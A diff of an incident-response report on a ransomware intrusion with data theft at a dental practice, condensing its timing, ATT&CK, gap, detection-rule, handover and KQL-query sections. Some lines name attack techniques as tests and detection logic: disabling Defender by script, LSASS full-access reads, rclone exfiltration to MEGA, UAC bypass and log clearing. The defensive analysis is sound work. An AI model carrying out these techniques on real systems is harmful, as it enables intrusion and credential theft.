-| H1 Insider (Emily) | Rejected (Confidence: High): her own logged steps are two downloads and two extractions; everything after runs from implant processes, as SYSTEM, at machine speed (E1–E3) |
-| H2 The MSP's own administration | Rejected (Confidence: High): a renamed rclone to a proton.me MEGA account, deleted backups and ransomware (E4–E6); the sign-ins after 13:44 fit a response instead (F9) |
-| H3 A commodity infection with no operator | Rejected (Confidence: Medium): tools staged per host on demand (E10), commands retyped after mangled quoting, and a new domain admin |
-| H4 Encryption without theft | Rejected (Confidence: High): three rclone copies of `C:\Shares` and 39 MEGA lookups (E4) |
+| H1 Insider | Rejected (Confidence: High): Emily's only steps are two downloads; the rest is implant work as SYSTEM |
+| H2 The MSP's own work | Rejected (Confidence: High): rclone to a proton.me MEGA account, deleted backups, ransomware |
+| H3 No operator | Rejected (Confidence: Medium): tools staged on demand, retyped commands, a new domain admin |
+| H4 No theft | Rejected (Confidence: High): three rclone copies and 39 MEGA lookups |
 
-**Dwell.** Observed span 16 h 50 min 14 s, from the download at 01:57:15 to the last event at 18:47:29. First execution
-to the domain controller: 2 h 29 min 07 s (01:59:15 to 04:28:22); to the first encryption: 3 h 13 min 50 s. Beaconing
-outlived the last encryption by 13 h 29 min 54 s. Time to detection: Defender's first true detection came at 09:23:31,
-7 h 26 min 16 s after the download, and no person acted until 13:44:55. End of exposure: not established (B8).
+### Dwell
 
-**Scope and impact.** Three of three hosts encrypted; 27 files renamed `.akira` and 128 notes. Accounts: Emily.Grant
-(password known to the attacker) and `svc_sql` (Domain Admins); every domain credential is exposed through the AD
-database copy. Data: `C:\Shares` on the file server of a dental and insurance practice left for MEGA; its contents are not
-logged, so it is treated as patient and claims data. Recovery: shadow copies, boot recovery and the backup catalog on the
-file server destroyed. Legal decides on notification.
+| Measure | Time |
+|---|---|
+| Observed span (first download to last event) | 16 h 50 min |
+| First execution to the domain controller | 2 h 29 min |
+| First execution to encryption | 3 h 14 min |
+| Beaconing after the encryption | 13 h 30 min |
+| First download to Defender's first real detection | 7 h 26 min |
+| First download to the first person at a console | 11 h 48 min |
+
+**Scope and impact.** Three of three hosts encrypted. Emily's password is known and `svc_sql` is a Domain Admin, and the AD
+database copy exposes every domain credential. `C:\Shares` left for MEGA and is treated as patient and claims data. The
+file server cannot recover locally. Legal decides on notification.
 
 ## 11. ATT&CK coverage
 
-Hunted, not observed: T1219 Remote Access Software (AnyDesk was installed before the intrusion; attacker use is not
-shown, F10); T1090.004 Domain Fronting (Cloudflare addresses only; fronting cannot be told from ordinary proxying here).
+Hunted, not observed: T1219 Remote Access Software (AnyDesk predates the intrusion, F10) and T1090.004 Domain Fronting
+(Cloudflare addresses only).
 
-| Stage | ATT&CK | Status |
-|---|---|---|
-| Initial access | T1566 Phishing (the download is logged; how it reached her is not) | Download observed; delivery inferred |
-| Execution | T1204.002 Malicious File; T1218.011 Rundll32; T1059.001 PowerShell; T1059.003 Windows Command Shell; T1047 Windows Management Instrumentation | Observed |
-| Defence evasion | T1553.005 Mark-of-the-Web Bypass (inferred, F1); T1055 Process Injection; T1036.005 Match Legitimate Name or Location; T1027 Obfuscated Files or Information (`-enc`); T1562.001 Disable or Modify Tools; T1070.001 Clear Windows Event Logs | Observed, except T1553.005 |
-| Privilege escalation | T1548.002 Bypass User Account Control | Observed |
-| Credential access | T1003.001 LSASS Memory (full-access opens; no dump logged); T1003.003 NTDS | Observed |
-| Discovery | T1018 Remote System Discovery; T1046 Network Service Discovery | Observed |
-| Lateral movement | T1021.002 SMB/Windows Admin Shares; T1078.002 Domain Accounts; T1570 Lateral Tool Transfer | Observed |
-| Command and control | T1071.001 Web Protocols; T1105 Ingress Tool Transfer | Observed; the real server behind Cloudflare is not identified |
-| Exfiltration | T1567.002 Exfiltration to Cloud Storage | Observed; volume not determined (B1) |
-| Persistence | T1547.001 Registry Run Keys; T1053.005 Scheduled Task; T1136.002 Domain Account; T1098.007 Additional Local or Domain Groups | Observed |
-| Impact | T1486 Data Encrypted for Impact; T1490 Inhibit System Recovery; T1489 Service Stop | Observed |
+| Stage | Techniques |
+|---|---|
+| Initial access, execution | T1566 Phishing; T1204.002 Malicious File; T1218.011 Rundll32; T1059.001 PowerShell; T1059.003 Command Shell; T1047 WMI |
+| Defence evasion | T1553.005 Mark-of-the-Web Bypass (inferred); T1055 Process Injection; T1036.005 Masquerading; T1027 Obfuscation; T1562.001 Disable Tools; T1070.001 Clear Event Logs |
+| Privilege escalation | T1548.002 Bypass UAC |
+| Credential access | T1003.001 LSASS Memory (access only); T1003.003 NTDS |
+| Discovery | T1018 Remote System Discovery; T1046 Network Service Discovery |
+| Lateral movement | T1021.002 Admin Shares; T1078.002 Domain Accounts; T1570 Lateral Tool Transfer |
+| Command and control | T1071.001 Web Protocols; T1105 Ingress Tool Transfer |
+| Exfiltration | T1567.002 Exfiltration to Cloud Storage |
+| Persistence | T1547.001 Run Keys; T1053.005 Scheduled Task; T1136.002 Domain Account; T1098.007 Domain Groups |
+| Impact | T1486 Encryption; T1490 Inhibit Recovery; T1489 Service Stop |
 
 ## 12. Detection and telemetry gaps
 
-Owners are proposed, not accepted.
+Every fix is proposed to Coastal MSP.
 
-| Gap | Impact | Fix (owner) | Acceptance test |
-|---|---|---|---|
-| Defender's workstation alert reached nobody (F8) | The servers kept beaconing for hours | Send Defender alerts to the MSP's on-call pager (MSP) | A test detection on the workstation pages the on-call within 5 minutes |
-| Defender could be switched off from a script on the server (F4) | The file server had no protection from 04:03 | Tamper Protection on every server (MSP) | `Set-MpPreference -DisableRealtimeMonitoring $true` from an admin shell leaves protection on |
-| A front-office user could mount an ISO and run a DLL from it | The foothold | Block ISO mounting; application control on mounted drives and `C:\Users\Public` (MSP) | A standard user cannot run a DLL from D: or an EXE from Public |
-| fodhelper elevated silently | SYSTEM on the workstation | UAC "Always notify"; no local admin for front-office accounts (MSP) | The same registry change no longer produces a High process |
-| LSASS was readable on all three hosts | Credential theft | LSASS protection (RunAsPPL) and Credential Guard (MSP) | A full-access open of lsass.exe is denied |
-| A workstation reached the admin shares of both servers | Lateral movement in two hops | Segment the network; block SMB and RPC from workstations to servers (MSP) | A port test from the workstation to both servers on 445 and 135 fails |
-| One user's password opened `C$` on the domain controller | Domain compromise | Users out of server administrators; separate admin accounts with MFA (MSP) | `net use \\ADDC01\C$` as Emily.Grant is refused |
-| Data could go to consumer cloud storage | Exfiltration | Block MEGA and similar services at the firewall and in DNS (MSP) | A MEGA lookup from the file server is blocked and logged |
-| Backups could be deleted from the host | No recovery | An offline or immutable copy of `C:\Shares` and the domain controller (MSP) | A test restore from that copy succeeds |
-| A new domain admin raised no alert | A standing backdoor | Alert on 4728 and 4732 for privileged groups, R11 (MSP) | Adding a test account to Domain Admins alerts within minutes |
-| Logs were cleared on the hosts, and the workstation's clear events never arrived (B3) | Lost evidence | Forward logs as they are written; alert on 1102 and 104 (MSP) | Clearing a test channel alerts and loses nothing centrally |
-| The first responder signed in to an infected server, and the sign-in ran a second copy of the implant as Administrator (F9) | Attacker code with a privileged token; the server was never isolated | An incident runbook: isolate before any interactive sign-in, and never sign in to a suspected host with a privileged account (MSP) | A tabletop exercise in which the responder isolates first |
-| R3 and R7 skip any path containing "Windows Defender" | The fake `MsMpEng.exe` inside that folder escapes both rules | Exclude only `\Windows Defender\Platform\`, by signer (MSP) | A replay flags the 03:47:19 file |
+| Gap | Fix | Test |
+|---|---|---|
+| Defender's alert reached nobody | Page the on-call for Defender alerts | A test detection pages within 5 minutes |
+| Defender could be switched off by script | Tamper Protection on every server | `Set-MpPreference` can no longer disable it |
+| An ISO lure ran a DLL | Block ISO mounting; app control on mounted drives and Public | A user cannot run a DLL from D: |
+| UAC bypassed silently | "Always notify"; no local admin for staff | The same trick yields no High process |
+| LSASS readable | LSASS protection and Credential Guard | A full-access open is denied |
+| The workstation reached server admin shares | Segment; block SMB and RPC to servers | 445 and 135 from the PC fail |
+| One user's password opened the DC | Separate admin accounts with MFA | `net use` as Emily is refused |
+| MEGA reachable | Block consumer cloud storage | A MEGA lookup is blocked and logged |
+| Backups deletable on the host | Offline or immutable copies | A test restore succeeds |
+| No alert on a new Domain Admin or a log clear | Alert on 4728, 4732, 1102 and 104; forward logs as written | A test add and a test clear both alert |
+| The responder signed in before isolating | Runbook: isolate first; no privileged sign-ins | A tabletop isolates first |
+| R3 and R7 skip any "Windows Defender" path | Exclude only `\Windows Defender\Platform\`, by signer | A replay flags the fake `MsMpEng.exe` |
 
 ## 13. New detections
 
-All eleven were replayed on 2026-10-23 against the whole dataset (E8, App B). R1–R7 are the v2 rules and return the v2
-counts exactly; R8–R11 were logic only in v2 and are written and tested here. A false positive is a hit on anything that
-is not attack activity; the dataset carries a day of ordinary background (Edge and OneDrive updaters, WMI, compatibility
-telemetry), and no rule fires on it. One simulated day is a thin benign baseline, so status for all eleven: proposed.
+All eleven were replayed on the whole dataset (E8). R1–R7 return the v2 counts; R8–R11 are new. No rule fires on the day's
+ordinary background, a thin baseline, so all eleven stay proposed.
 
-| Rule | Logic (source) | Maps to | Hits / FP (unit) |
-|---|---|---|---|
-| R1 | rundll32.exe running a DLL from a drive other than C: (Sysmon 1) | T1218.011 | 4 / 0 (processes) |
-| R2 | `ms-settings\shell\open\command` written, by command line or registry event (Sysmon 1, 13) | T1548.002 | 6 / 0 (events) |
-| R3 | A program started from `C:\Users\Public` or `C:\ProgramData\Microsoft` (Sysmon 1) | T1036.005 | 7 / 0 (processes) |
-| R4 | Remote thread into spoolsv.exe or notepad.exe (Sysmon 8) | T1055 | 13 / 0 (threads) |
-| R5 | `--config` + `copy` + a named remote on one command line (Sysmon 1) | T1567.002 | 3 / 0 (processes) |
-| R6 | An account added to the domain or an admin group from a command line (Sysmon 1) | T1136.002, T1098.007 | 13 / 0 (processes) |
-| R7 | A DNS lookup by a program in Public, ProgramData or by rundll32.exe (Sysmon 22) | T1071.001 | 64 / 0 (lookups) |
-| R8 | lsass.exe opened with 0x1fffff by anything but Defender (Sysmon 10) | T1003.001 | 5 / 0 (opens) |
-| R9 | WMI `process call create` on a node, or a shell started by WmiPrvSE.exe (Sysmon 1) | T1047 | 1 / 0 (processes) |
-| R10 | Shadow-copy, boot-recovery, backup-catalog, AD-export or log-clear commands, and the logs' own clear events (Sysmon 1; Security 1102; System 104) | T1490, T1003.003, T1070.001 | 128 / 0 (events) |
-| R11 | A member added to Domain, Enterprise or Schema Admins or Administrators (Security 4728, 4732, 4756) | T1098.007 | 2 / 0 (changes) |
-
-Expected false positives and tuning: R1 installers on mounted media (allow by signer); R3 vendor updaters under
-ProgramData (audit first, then allow by signer; narrow the Defender exclusion to `\Platform\`, §12); R4 accessibility and
-security tools (exclude signed vendor paths, never a source in Public); R5 a genuine rclone backup (allow by host and
-account, never by file name, since the attacker renamed the tool); R6 and R11 real provisioning (alert outside change
-windows); R7 vendor agents (allow known signers); R8 backup and EDR agents (allow by signer); R9 management tools (allow
-known admin hosts); R10 a planned backup rotation (rare enough to alert on every hit).
+| Rule | Fires on | Maps to | Hits / FP | Tune for |
+|---|---|---|---|---|
+| R1 | rundll32 running a DLL off C: | T1218.011 | 4 / 0 | Installers on media |
+| R2 | The `ms-settings` handler written | T1548.002 | 6 / 0 | Nothing legitimate |
+| R3 | A program started from Public or ProgramData\Microsoft | T1036.005 | 7 / 0 | Signed vendor updaters |
+| R4 | A remote thread into spoolsv or notepad | T1055 | 13 / 0 | Signed accessibility tools |
+| R5 | rclone-style `--config … copy remote:` | T1567.002 | 3 / 0 | Real backups, by host |
+| R6 | An account added from a command line | T1136.002 | 13 / 0 | Change windows |
+| R7 | DNS from Public, ProgramData or rundll32 | T1071.001 | 64 / 0 | Signed agents |
+| R8 | LSASS opened with full access | T1003.001 | 5 / 0 | Backup and EDR agents |
+| R9 | WMI process creation on a node | T1047 | 1 / 0 | Admin hosts |
+| R10 | Recovery, AD-export or log-clear commands, and clear events | T1490, T1070.001 | 128 / 0 | None: alert on every hit |
+| R11 | A member added to a privileged group | T1098.007 | 2 / 0 | Change windows |
 
 ## 14. Handover to IR
 
-Compromise confirmed: human-operated ransomware with data theft and a domain compromise. For the client IR lead and Legal;
-every action is recommended, not executed (range).
+Confirmed: human-operated ransomware with data theft and domain compromise. Recommended, not executed (range).
 
-| # | Risk (since) | Action |
+| # | Risk (since, UTC) | Action |
 |---|---|---|
-| 1 | The file server and the domain controller under attacker control; the DC still beaconing at the end of the data (since 2026-02-04 03:35:11 UTC) | Isolate both now; block `cdn.cloud-endpoint.net` and `sync.cloud-endpoint.net` at DNS and the firewall |
-| 2 | `svc_sql` in Domain Admins (since 2026-02-04 05:22:57 UTC) | Disable and delete it; review every privileged group |
-| 3 | The AD database copied (since 2026-02-04 04:33:55 UTC) | Reset every domain password and the `krbtgt` password twice; rebuild the DC from a backup taken before 4 February |
-| 4 | Emily.Grant's password known to the attacker (since 2026-02-04 03:34:09 UTC at the latest) | Reset it and review her sign-ins |
-| 5 | `C:\Shares` exfiltrated (since 2026-02-04 03:57:40 UTC) | Legal: notification decision for patient and claims data |
-| 6 | Implants and persistence remain: Run key `SecurityHealth`, task `WindowsUpdate`, `OneDriveSync.exe`, `wsync.exe`, `RuntimeBroker.exe` | Remove them from isolated hosts; never sign in interactively before isolation (F9) |
-| 7 | Recovery destroyed on the file server | Restore from an offline copy, if one exists |
-| 8 | Evidence ages out | Preserve the table's rows and AnyDesk's `connection_trace.txt` |
+| 1 | File server and DC under attacker control (03:35:11) | Isolate both; block both `cloud-endpoint.net` names |
+| 2 | `svc_sql` in Domain Admins (05:22:57) | Disable and delete it; review privileged groups |
+| 3 | AD database copied (04:33:55) | Reset all passwords and `krbtgt` twice; rebuild the DC |
+| 4 | Emily's password known (03:34:09) | Reset it; review her sign-ins |
+| 5 | `C:\Shares` exfiltrated (03:57:40) | Legal: breach notification |
+| 6 | Implants and persistence remain | Remove them from isolated hosts only (F9) |
+| 7 | Local recovery destroyed | Restore from an offline copy |
+| 8 | Evidence ages out | Preserve the rows and AnyDesk's `connection_trace.txt` |
 
-A password reset on its own would not help: the domain admin, the AD database copy and the implants would all survive it.
+A password reset alone changes nothing: the domain admin, the AD copy and the implants all survive it.
 
 ## 15. Next-hunt leads
 
 | Lead | Data needed |
 |---|---|
-| Who used AnyDesk at 10:43 and 13:47 (F10) | AnyDesk connection logs and `connection_trace.txt`; the MSP's records |
-| How much of `C:\Shares` reached MEGA | Firewall or proxy logs from 2026-02-04 03:57:40 UTC |
-| Whether the AD database copy left the DC | Network logs; file-share auditing on ADDC01 |
-| The real server behind `cloud-endpoint.net` | Passive DNS; a Cloudflare abuse report |
-| Who was at the two consoles at 13:44 and 13:49 | The MSP's ticket and on-call records |
-| The workstation's missing log-clear events (B3) | The workstation's own Security and System logs, if they survive |
+| Who used AnyDesk at 10:43 and 13:47 | AnyDesk logs; MSP records |
+| How much reached MEGA | Firewall or proxy logs from 03:57:40 |
+| Whether the AD copy left the DC | Network logs; share auditing |
+| The server behind `cloud-endpoint.net` | Passive DNS; a Cloudflare abuse report |
+| Who was at the consoles at 13:44 and 13:49 | MSP tickets and on-call records |
 
 ## 16. AI tools declaration
 
@@ -392,7 +334,9 @@ workspace("LAW-SilentCorridor").HarborlightDental_CL
 | where T has "Downloads"
 | project EventTime, EventID, Img, T
 | order by EventTime asc
+```
 
+```kql
 // q2 Process tree with integrity level (the fodhelper attempts)
 workspace("LAW-SilentCorridor").HarborlightDental_CL
 | where TimeGenerated > ago(1000d) and Computer has "BACKOFFICE-PC1" and EventID == "1"
@@ -402,7 +346,9 @@ workspace("LAW-SilentCorridor").HarborlightDental_CL
 | where Img has_any ("fodhelper", "taskhostw", "reg.exe")
 | project EventTime, Img, Cmd, IL, Parent
 | order by EventTime asc
+```
 
+```kql
 // q3 Injection into the Print Spooler, per host
 workspace("LAW-SilentCorridor").HarborlightDental_CL
 | where TimeGenerated > ago(1000d) and EventID in ("8","10")
@@ -411,7 +357,9 @@ workspace("LAW-SilentCorridor").HarborlightDental_CL
          Access = extract("GrantedAccess.>([^<]+)", 1, X)
 | where Tgt has "spoolsv"
 | summarize First = min(tostring(EventTime)), n = count() by Computer, EventID, Src, Access
+```
 
+```kql
 // q4 Beaconing: destination, port, volume and last-seen per implant
 workspace("LAW-SilentCorridor").HarborlightDental_CL
 | where TimeGenerated > ago(1000d) and EventID == "3"
@@ -420,13 +368,17 @@ workspace("LAW-SilentCorridor").HarborlightDental_CL
          Port = extract("DestinationPort.>([^<]+)", 1, X)
 | where Img has_any ("Public", "ProgramData", "rundll32") and not(Dst startswith "172.16.")
 | summarize First = min(tostring(EventTime)), Last = max(tostring(EventTime)), n = count() by Computer, Img, Dst, Port
+```
 
+```kql
 // q5 Ransom notes and encrypted files per host
 workspace("LAW-SilentCorridor").HarborlightDental_CL
 | where TimeGenerated > ago(1000d) and EventID == "11"
 | extend F = extract("TargetFilename.>([^<]+)", 1, tostring(EventData_Xml))
 | summarize Notes = countif(F has "akira_readme"), EncryptedFiles = dcountif(F, F endswith ".akira") by Computer
+```
 
+```kql
 // q6 Tool staging: every lookup of the cloud-endpoint.net names, and the encoded PowerShell that fetched the tools
 let T = workspace("LAW-SilentCorridor").HarborlightDental_CL | extend X = tostring(EventData_Xml);
 union
